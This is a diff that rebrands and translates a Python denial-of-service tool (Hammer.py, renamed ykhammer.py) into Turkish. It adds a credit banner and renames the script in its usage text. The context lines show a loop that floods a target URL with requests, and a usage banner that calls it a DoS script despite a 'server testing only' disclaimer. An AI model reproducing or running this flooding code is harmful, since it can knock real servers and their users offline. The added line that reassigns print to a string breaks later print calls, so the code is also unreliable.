@@ -10,6 +10,9 @@ from queue import Queue
 from optparse import OptionParser
 import time,sys,socket,threading,logging,urllib.request,random
 
+
+print=("FROXY TARAFINDAN KODLANIP YAKALAYAMAZSIN CHECKER HİZMETİNE SUNULMUŞTUR...")
+
 def user_agent():
 	global uagent
 	uagent=[]
@@ -35,7 +38,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94mBot saldırısını yapıyor...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -78,7 +81,7 @@ def usage():
 	print (''' \033[92m	YKHammer Dos Komut Dosyası v.1 http://furkanmiklarpersonal.000.pe/
 Geçerli tüm yasalara uymak son kullanıcının sorumluluğundadır.
 Bu sadece sunucu test betiği içindir. IP'niz görünüyor. \N
-kullanım: python3 Hammer.py [-s] [-p] [-t]
+kullanım: python3 ykhammer.py [-s] [-p] [-t]
 -h : yardım
 -s : sunucu IP'si
 -p : bağlantı noktası varsayılanı 80
